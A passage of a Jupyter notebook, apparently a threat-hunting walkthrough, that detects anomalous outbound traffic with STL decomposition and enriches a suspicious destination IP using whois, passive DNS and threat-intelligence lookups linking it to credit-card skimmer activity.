xutuDaWUJk/4FeFcLi6uz+nGG5ZPq3GP+e65xoQEvO//cWihKEn8L8Sq+/izZazv7gqc0rmRMc/\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[168]},\"seasonal\":[-10458,-7690,-8466,-9552,-10514,-9215,-9524,8782,7561,9658,10685,10210,9698,10884,8889,5836,7403,5602,8483,8088,-14677,-11288,-9208,-8551,-10181,-8656,-8195,-9509,-10156,-9215,-9452,7994,6735,9524,9810,8719,8658,9227,8668,6658,6271,5616,9211,7592,-9991,-8307,-9455,-8624,-9901,-9431,-7963,-9404,-9790,-9239,-9286,7033,5986,9059,8898,7406,7385,7637,8134,7080,5115,5440,9664,7158,-4856,-4732,-9579,-8655,-9718,-10112,-7679,-9427,-9565,-9103,-8904,5840,5356,8122,7794,5979,6015,6134,7208,7089,3930,5027,9726,6462,320,-1180,-9490,-8466,-8296,-8841,-6491,-8365,-8606,-8191,-7255,3926,4452,5776,5503,5040,4314,5160,5648,5833,3319,3911,6945,5423,1769,232,-6786,-6621,-6446,-6892,-4846,-6769,-7243,-7131,-5473,2384,3672,3503,3451,4244,2491,4219,4009,4487,2553,2535,4116,4623,3484,2122,-4193,-4758,-4547,-4911,-3155,-5178,-5914,-5988,-3596,953,2684,1237,1313,3319,639,3329,2506,3190,1749,1077,1013,3722,4269,3314,-1259,-2719],\"trend\":[21444,21488,21532,21578,21625,21674,21722,21772,21821,21871,21920,21967,22014,22059,22102,22143,22182,22221,22265,22290,22313,22333,22349,22361,22363,22355,22336,22305,22265,22217,22160,22092,22016,21934,21851,21770,21693,21627,21575,21540,21524,21526,21548,21585,21635,21695,21766,21846,21935,22031,22130,22229,22321,22396,22455,22501,22537,22566,22588,22606,22621,22633,22637,22630,22608,22572,22522,22462,22396,22328,22265,22216,22187,22182,22201,22238,22281,22317,22336,22334,22309,22260,22193,22113,22025,21933,21844,21768,21714,21681,21671,21681,21707,21742,21779,21808,21830,21846,21868,21908,21996,22161,22410,22731,23102,23493,23869,24199,24455,24623,24700,24693,24612,24465,24259,24002,23704,23374,23017,22632,22221,21782,21311,20803,20249,19646,19000,18329,17659,17021,16449,15968,15596,15334,15167,15063,14996,14955,14936,14933,14942,14961,14991,15031,15081,15136,15195,15258,15317,15367,15303,15212,15115,15015,14913,14807,14698,14584,14466,14343,14215,14082,13944,13801,13652,13497,13336,13171],\"weights\":[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]},\"selected\":{\"id\":\"4120\"},\"selection_policy\":{\"id\":\"4119\"}},\"id\":\"4072\",\"type\":\"ColumnDataSource\"},{\"attributes\":{},\"id\":\"4240\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"fill_color\":{\"value\":\"#1f77b4\"},\"line_color\":{\"value\":\"navy\"},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"TotalBytesSent\"}},\"id\":\"4111\",\"type\":\"Circle\"},{\"attributes\":{\"below\":[{\"id\":\"4197\"},{\"id\":\"4202\"}],\"center\":[{\"id\":\"4200\"}],\"plot_height\":120,\"plot_width\":1200,\"renderers\":[{\"id\":\"4209\"}],\"title\":{\"id\":\"4187\"},\"toolbar\":{\"id\":\"4201\"},\"toolbar_location\":null,\"x_range\":{\"id\":\"4189\"},\"x_scale\":{\"id\":\"4193\"},\"y_range\":{\"id\":\"4191\"},\"y_scale\":{\"id\":\"4195\"}},\"id\":\"4186\",\"subtype\":\"Figure\",\"type\":\"Plot\"},{\"attributes\":{\"source\":{\"id\":\"4159\"}},\"id\":\"4164\",\"type\":\"CDSView\"},{\"attributes\":{\"label\":{\"value\":\"baseline\"},\"renderers\":[{\"id\":\"4138\"}]},\"id\":\"4158\",\"type\":\"LegendItem\"},{\"attributes\":{\"data_source\":{\"id\":\"4205\"},\"glyph\":{\"id\":\"4207\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"4208\"},\"selection_glyph\":null,\"view\":{\"id\":\"4210\"}},\"id\":\"4209\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"line_alpha\":0.1,\"line_color\":\"green\",\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"baseline\"}},\"id\":\"4137\",\"type\":\"Line\"},{\"attributes\":{\"days\":[1,4,7,10,13,16,19,22,25,28]},\"id\":\"4246\",\"type\":\"DaysTicker\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.1},\"fill_color\":{\"value\":\"firebrick\"},\"line_alpha\":{\"value\":0.1},\"line_color\":{\"value\":\"firebrick\"},\"size\":{\"units\":\"screen\",\"value\":12},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"TotalBytesSent\"}},\"id\":\"4162\",\"type\":\"CircleX\"},{\"attributes\":{\"months\":[0,1,2,3,4,5,6,7,8,9,10,11]},\"id\":\"4249\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"data_source\":{\"id\":\"4072\"},\"glyph\":{\"id\":\"4136\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"4137\"},\"selection_glyph\":null,\"view\":{\"id\":\"4139\"}},\"id\":\"4138\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"click_policy\":\"hide\",\"items\":[{\"id\":\"4134\"},{\"id\":\"4158\"},{\"id\":\"4185\"}],\"location\":\"top_left\"},\"id\":\"4133\",\"type\":\"Legend\"},{\"attributes\":{\"label\":{\"value\":\"observed\"},\"renderers\":[{\"id\":\"4113\"}]},\"id\":\"4134\",\"type\":\"LegendItem\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.1},\"fill_color\":{\"value\":\"blue\"},\"line_alpha\":{\"value\":0.1},\"line_color\":{\"value\":\"blue\"},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"score\"}},\"id\":\"4208\",\"type\":\"Circle\"},{\"attributes\":{\"base\":24,\"mantissas\":[1,2,4,6,8,12],\"max_interval\":43200000.0,\"min_interval\":3600000.0,\"num_minor_ticks\":0},\"id\":\"4244\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"months\":[0,4,8]},\"id\":\"4251\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"months\":[0,2,4,6,8,10]},\"id\":\"4250\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.2},\"fill_color\":{\"value\":\"firebrick\"},\"line_color\":{\"value\":\"firebrick\"},\"size\":{\"units\":\"screen\",\"value\":12},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"TotalBytesSent\"}},\"id\":\"4161\",\"type\":\"CircleX\"},{\"attributes\":{\"base\":60,\"mantissas\":[1,2,5,10,15,20,30],\"max_interval\":1800000.0,\"min_interval\":1000.0,\"num_minor_ticks\":0},\"id\":\"4243\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"fill_alpha\":0.2,\"fill_color\":\"navy\",\"level\":\"overlay\",\"line_alpha\":1.0,\"line_color\":\"black\",\"line_dash\":[2,2],\"line_width\":0.5},\"id\":\"4212\",\"type\":\"BoxAnnotation\"},{\"attributes\":{\"days\":[1,15]},\"id\":\"4248\",\"type\":\"DaysTicker\"},{\"attributes\":{\"mantissas\":[1,2,5],\"max_interval\":500.0,\"num_minor_ticks\":0},\"id\":\"4242\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"data_source\":{\"id\":\"4159\"},\"glyph\":{\"id\":\"4161\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"4162\"},\"selection_glyph\":null,\"view\":{\"id\":\"4164\"}},\"id\":\"4163\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"source\":{\"id\":\"4072\"}},\"id\":\"4139\",\"type\":\"CDSView\"},{\"attributes\":{},\"id\":\"4241\",\"type\":\"Selection\"},{\"attributes\":{\"label\":{\"value\":\"anomalies\"},\"renderers\":[{\"id\":\"4163\"}]},\"id\":\"4185\",\"type\":\"LegendItem\"},{\"attributes\":{\"days\":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]},\"id\":\"4245\",\"type\":\"DaysTicker\"}],\"root_ids\":[\"4216\"]},\"title\":\"Bokeh Application\",\"version\":\"2.1.1\"}};\n",
       "  var render_items = [{\"docid\":\"b730cec6-3877-4669-9034-7e2afa471a88\",\"root_ids\":[\"4216\"],\"roots\":{\"4216\":\"ef5b35e3-0982-463a-80be-2ef0e366f3bc\"}}];\n",
       "  root.Bokeh.embed.embed_items_notebook(docs_json, render_items);\n",
       "\n",
       "  }\n",
       "  if (root.Bokeh !== undefined) {\n",
       "    embed_document(root);\n",
       "  } else {\n",
       "    var attempts = 0;\n",
       "    var timer = setInterval(function(root) {\n",
       "      if (root.Bokeh !== undefined) {\n",
       "        clearInterval(timer);\n",
       "        embed_document(root);\n",
       "      } else {\n",
       "        attempts++;\n",
       "        if (attempts > 100) {\n",
       "          clearInterval(timer);\n",
       "          console.log(\"Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing\");\n",
       "        }\n",
       "      }\n",
       "    }, 10, root)\n",
       "  }\n",
       "})(window);"
      ],
      "application/vnd.bokehjs_exec.v0+json": ""
     },
     "metadata": {
      "application/vnd.bokehjs_exec.v0+json": {
       "id": "4216"
      }
     },
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div style=\"display: table;\"><div style=\"display: table-row;\"><div style=\"display: table-cell;\"><b title=\"bokeh.models.layouts.Column\">Column</b>(</div><div style=\"display: table-cell;\">id&nbsp;=&nbsp;'4476', <span id=\"4478\" style=\"cursor: pointer;\">&hellip;)</span></div></div><div class=\"4477\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">align&nbsp;=&nbsp;'start',</div></div><div class=\"4477\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">aspect_ratio&nbsp;=&nbsp;None,</div></div><div class=\"4477\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">background&nbsp;=&nbsp;None,</div></div><div class=\"4477\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">children&nbsp;=&nbsp;[Figure(id='4074', ...), Figure(id='4186', ...)],</div></div><div class=\"4477\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">css_classes&nbsp;=&nbsp;[],</div></div><div class=\"4477\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">disabled&nbsp;=&nbsp;False,</div></div><div class=\"4477\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">height&nbsp;=&nbsp;None,</div></div><div class=\"4477\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">height_policy&nbsp;=&nbsp;'auto',</div></div><div class=\"4477\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">js_event_callbacks&nbsp;=&nbsp;{},</div></div><div class=\"4477\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">js_property_callbacks&nbsp;=&nbsp;{},</div></div><div class=\"4477\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">margin&nbsp;=&nbsp;(0, 0, 0, 0),</div></div><div class=\"4477\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">max_height&nbsp;=&nbsp;None,</div></div><div class=\"4477\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">max_width&nbsp;=&nbsp;None,</div></div><div class=\"4477\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">min_height&nbsp;=&nbsp;None,</div></div><div class=\"4477\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">min_width&nbsp;=&nbsp;None,</div></div><div class=\"4477\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">name&nbsp;=&nbsp;None,</div></div><div class=\"4477\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">rows&nbsp;=&nbsp;'auto',</div></div><div class=\"4477\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">sizing_mode&nbsp;=&nbsp;None,</div></div><div class=\"4477\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">spacing&nbsp;=&nbsp;0,</div></div><div class=\"4477\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">subscribed_events&nbsp;=&nbsp;[],</div></div><div class=\"4477\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">tags&nbsp;=&nbsp;[],</div></div><div class=\"4477\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">visible&nbsp;=&nbsp;True,</div></div><div class=\"4477\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">width&nbsp;=&nbsp;None,</div></div><div class=\"4477\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">width_policy&nbsp;=&nbsp;'auto')</div></div></div>\n",
       "<script>\n",
       "(function() {\n",
       "  var expanded = false;\n",
       "  var ellipsis = document.getElementById(\"4478\");\n",
       "  ellipsis.addEventListener(\"click\", function() {\n",
       "    var rows = document.getElementsByClassName(\"4477\");\n",
       "    for (var i = 0; i < rows.length; i++) {\n",
       "      var el = rows[i];\n",
       "      el.style.display = expanded ? \"none\" : \"table-row\";\n",
       "    }\n",
       "    ellipsis.innerHTML = expanded ? \"&hellip;)\" : \"&lsaquo;&lsaquo;&lsaquo;\";\n",
       "    expanded = !expanded;\n",
       "  });\n",
       "})();\n",
       "</script>\n"
      ],
      "text/plain": [
       "Column(id='4476', ...)"
      ]
     },
     "execution_count": 49,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "stldemo = pd.read_csv(\n",
    "   \"networklogs.csv\", index_col=[\"TimeGenerated\"], usecols=[\"TimeGenerated\",\"TotalBytesSent\"], parse_dates=[\"TimeGenerated\"], infer_datetime_format=True)\n",
    "output = timeseries_anomalies_stl(stldemo)\n",
    "display_timeseries_anomolies(data=output, y= 'TotalBytesSent')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<p style=''>Anomolous session start time: 2020-07-03 20:00:00</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Anomolous session end time: 2020-07-03 22:00:00</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "start = output[output['anomalies']==1]['TimeGenerated'].min()\n",
    "end = output[output['anomalies']==1]['TimeGenerated'].max() +  pd.to_timedelta(1, unit='h')\n",
    "md(f\"Anomolous session start time: {start}\")\n",
    "md(f\"Anomolous session end time: {end}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Enrich and Pivot on IP Addresses"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<p style='font-weight: bold'>Top talkers during anomolous session: </p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "SoureIP        DestinationIP\n",
       "Our Source IP  31.220.60.108    8328\n",
       "10.16.12.1     40.124.45.19     1004\n",
       "10.0.3.5       40.124.45.19      621\n",
       "10.4.5.12      13.71.172.130     247\n",
       "               40.77.232.95      189\n",
       "Name: TotalBytesSent, dtype: int64"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Splunk?\n",
    "net_data = pd.read_csv(\n",
    "    \"raw_network.csv\", index_col=[\"TimeGenerated\"], parse_dates=[\"TimeGenerated\"], infer_datetime_format=True)\n",
    "grouped_df = net_data.groupby(['SoureIP', 'DestinationIP'])\n",
    "noisy_hosts = grouped_df['TotalBytesSent'].agg(np.sum).sort_values(ascending=False)\n",
    "md(\"Top talkers during anomolous session: \", 'bold')\n",
    "display(noisy_hosts[:5])\n",
    "source_ip = noisy_hosts.index[0][0]\n",
    "dest_ip = noisy_hosts.index[0][1]\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### ASN/TI"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Using Open PageRank. See https://www.domcop.com/openpagerank/what-is-openpagerank\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<p style='font-weight: bold'>Target IP: 31.220.60.108</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>31.220.60.108 is a Public IP address</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style='font-weight: bold'>Whois Registrar Info :</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>ASN Owner: AS-HOSTINGER, LT</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>ASN Address: Hostinger International Ltd.\n",
       "61 Lordou Vyronos\n",
       "Lumiel Building, 4th floor\n",
       "6023\n",
       "Larnaca\n",
       "CYPRUS</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style='font-weight: bold'>Passive DNS records for 31.220.60.108:</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "idpcdn-cloud.com  -  2020-07-08T03:25:00Z\n",
      "cdn-xhr.com  -  2020-07-05T06:16:00Z\n",
      "hivnd.net  -  2020-06-30T01:33:00Z\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<p style='font-weight: bold'>Threat Intel results for 31.220.60.108:</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Ioc</th>\n",
       "      <th>IocType</th>\n",
       "      <th>QuerySubtype</th>\n",
       "      <th>Provider</th>\n",
       "      <th>Result</th>\n",
       "      <th>Severity</th>\n",
       "      <th>Details</th>\n",
       "      <th>RawResult</th>\n",
       "      <th>Reference</th>\n",
       "      <th>Status</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>OTX</th>\n",
       "      <td>31.220.60.108</td>\n",
       "      <td>ipv4</td>\n",
       "      <td>None</td>\n",
       "      <td>OTX</td>\n",
       "      <td>True</td>\n",
       "      <td>high</td>\n",
       "      <td>{'pulse_count': 4, 'names': ['Credit card skimmer targets ASP.NET sites', 'Credit-Card Skimmer H...</td>\n",
       "      <td>{'sections': ['general', 'geo', 'reputation', 'url_list', 'passive_dns', 'malware', 'nids_list',...</td>\n",
       "      <td>https://otx.alienvault.com/api/v1/indicators/IPv4/31.220.60.108/general</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>XForce</th>\n",
       "      <td>31.220.60.108</td>\n",
       "      <td>ipv4</td>\n",
       "      <td>None</td>\n",
       "      <td>XForce</td>\n",
       "      <td>True</td>\n",
       "      <td>warning</td>\n",
       "      <td>{'score': 1, 'cats': {}, 'categoryDescriptions': {}, 'reason': 'Regional Internet Registry', 're...</td>\n",
       "      <td>{'ip': '31.220.60.108', 'history': [{'created': '2012-03-22T07:26:00.000Z', 'reason': 'Regional ...</td>\n",
       "      <td>https://api.xforce.ibmcloud.com/ipr/31.220.60.108</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                  Ioc IocType QuerySubtype Provider Result Severity  \\\n",
       "OTX     31.220.60.108    ipv4         None      OTX   True     high   \n",
       "XForce  31.220.60.108    ipv4         None   XForce   True  warning   \n",
       "\n",
       "                                                                                                    Details  \\\n",
       "OTX     {'pulse_count': 4, 'names': ['Credit card skimmer targets ASP.NET sites', 'Credit-Card Skimmer H...   \n",
       "XForce  {'score': 1, 'cats': {}, 'categoryDescriptions': {}, 'reason': 'Regional Internet Registry', 're...   \n",
       "\n",
       "                                                                                                  RawResult  \\\n",
       "OTX     {'sections': ['general', 'geo', 'reputation', 'url_list', 'passive_dns', 'malware', 'nids_list',...   \n",
       "XForce  {'ip': '31.220.60.108', 'history': [{'created': '2012-03-22T07:26:00.000Z', 'reason': 'Regional ...   \n",
       "\n",
       "                                                                      Reference  \\\n",
       "OTX     https://otx.alienvault.com/api/v1/indicators/IPv4/31.220.60.108/general   \n",
       "XForce                        https://api.xforce.ibmcloud.com/ipr/31.220.60.108   \n",
       "\n",
       "       Status  \n",
       "OTX         0  \n",
       "XForce      0  "
      ]
     },
     "execution_count": 52,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from ipwhois import IPWhois\n",
    "from msticpy.sectools.ip_utils import get_whois_info, get_ip_type\n",
    "ti = TILookup()\n",
    "\n",
    "md(f\"Target IP: {dest_ip}\", 'bold')\n",
    "md(f\"{dest_ip} is a {get_ip_type(dest_ip)} IP address\")\n",
    "whois_info = get_whois_info(dest_ip)\n",
    "md(f'Whois Registrar Info :', styles=[\"bold\"])\n",
    "md(f\"ASN Owner: {whois_info[0]}\")\n",
    "md(f\"ASN Address: {whois_info[1]['nets'][0]['address']}\")\n",
    "    \n",
    "result = ti.lookup_ioc(observable=\"31.220.60.108\", ico_type=\"ipv4\", ioc_query_type=\"passivedns\", providers=[\"XForce\"])\n",
    "md(f\"Passive DNS records for {dest_ip}:\", styles=[\"bold\"])\n",
    "for res in ti.result_to_df(result)['RawResult'][0]['Passive']['records']:\n",
    "    print(res['value'],\" - \", res['last'])\n",
    "    \n",
    "\n",
    "resp = ti.lookup_ioc(observable=dest_ip)\n",
    "md(f\"Threat Intel results for {dest_ip}:\", styles=[\"bold\"])\n",
    "ti.result_to_df(resp)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "This product includes GeoLite2 data created by MaxMind, available from\n",
       "<a href=\"https://www.maxmind.com\">https://www.maxmind.com</a>.\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''><h3>Locaiton of remote IP</h3></p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div style=\"width:100%;\"><div style=\"position:relative;width:100%;height:0;padding-bottom:60%;\"><span style=\"color:#565656\">Make this Notebook Trusted to load map: File -> Trust Notebook</span><iframe src=\"about:blank\" style=\"position:absolute;width:100%;height:100%;left:0;top:0;border:none !important;\" data-html=PCFET0NUWVBFIGh0bWw+CjxoZWFkPiAgICAKICAgIDxtZXRhIGh0dHAtZXF1aXY9ImNvbnRlbnQtdHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04IiAvPgogICAgCiAgICAgICAgPHNjcmlwdD4KICAgICAgICAgICAgTF9OT19UT1VDSCA9IGZhbHNlOwogICAgICAgICAgICBMX0RJU0FCTEVfM0QgPSBmYWxzZTsKICAgICAgICA8L3NjcmlwdD4KICAgIAogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9ucG0vbGVhZmxldEAxLjYuMC9kaXN0L2xlYWZsZXQuanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vY29kZS5qcXVlcnkuY29tL2pxdWVyeS0xLjEyLjQubWluLmpzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQgc3JjPSJodHRwczovL21heGNkbi5ib290c3RyYXBjZG4uY29tL2Jvb3RzdHJhcC8zLjIuMC9qcy9ib290c3RyYXAubWluLmpzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9MZWFmbGV0LmF3ZXNvbWUtbWFya2Vycy8yLjAuMi9sZWFmbGV0LmF3ZXNvbWUtbWFya2Vycy5qcyI+PC9zY3JpcHQ+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9ucG0vbGVhZmxldEAxLjYuMC9kaXN0L2xlYWZsZXQuY3NzIi8+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vbWF4Y2RuLmJvb3RzdHJhcGNkbi5jb20vYm9vdHN0cmFwLzMuMi4wL2Nzcy9ib290c3RyYXAubWluLmNzcyIvPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL21heGNkbi5ib290c3RyYXBjZG4uY29tL2Jvb3RzdHJhcC8zLjIuMC9jc3MvYm9vdHN0cmFwLXRoZW1lLm1pbi5jc3MiLz4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9tYXhjZG4uYm9vdHN0cmFwY2RuLmNvbS9mb250LWF3ZXNvbWUvNC42LjMvY3NzL2ZvbnQtYXdlc29tZS5taW4uY3NzIi8+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL0xlYWZsZXQuYXdlc29tZS1tYXJrZXJzLzIuMC4yL2xlYWZsZXQuYXdlc29tZS1tYXJrZXJzLmNzcyIvPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL3Jhd2Nkbi5naXRoYWNrLmNvbS9weXRob24tdmlzdWFsaXphdGlvbi9mb2xpdW0vbWFzdGVyL2ZvbGl1bS90ZW1wbGF0ZXMvbGVhZmxldC5hd2Vzb21lLnJvdGF0ZS5jc3MiLz4KICAgIDxzdHlsZT5odG1sLCBib2R5IHt3aWR0aDogMTAwJTtoZWlnaHQ6IDEwMCU7bWFyZ2luOiAwO3BhZGRpbmc6IDA7fTwvc3R5bGU+CiAgICA8c3R5bGU+I21hcCB7cG9zaXRpb246YWJzb2x1dGU7dG9wOjA7Ym90dG9tOjA7cmlnaHQ6MDtsZWZ0OjA7fTwvc3R5bGU+CiAgICAKICAgICAgICAgICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwKICAgICAgICAgICAgICAgIGluaXRpYWwtc2NhbGU9MS4wLCBtYXhpbXVtLXNjYWxlPTEuMCwgdXNlci1zY2FsYWJsZT1ubyIgLz4KICAgICAgICAgICAgPHN0eWxlPgogICAgICAgICAgICAgICAgI21hcF8wOWJlNTRhN2RlNTE0NmM1YTk2NGM5Y2U0NTY3Y2JiMyB7CiAgICAgICAgICAgICAgICAgICAgcG9zaXRpb246IHJlbGF0aXZlOwogICAgICAgICAgICAgICAgICAgIHdpZHRoOiAxMDAuMCU7CiAgICAgICAgICAgICAgICAgICAgaGVpZ2h0OiAxMDAuMCU7CiAgICAgICAgICAgICAgICAgICAgbGVmdDogMC4wJTsKICAgICAgICAgICAgICAgICAgICB0b3A6IDAuMCU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIDwvc3R5bGU+CiAgICAgICAgCjwvaGVhZD4KPGJvZHk+ICAgIAogICAgCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvbGl1bS1tYXAiIGlkP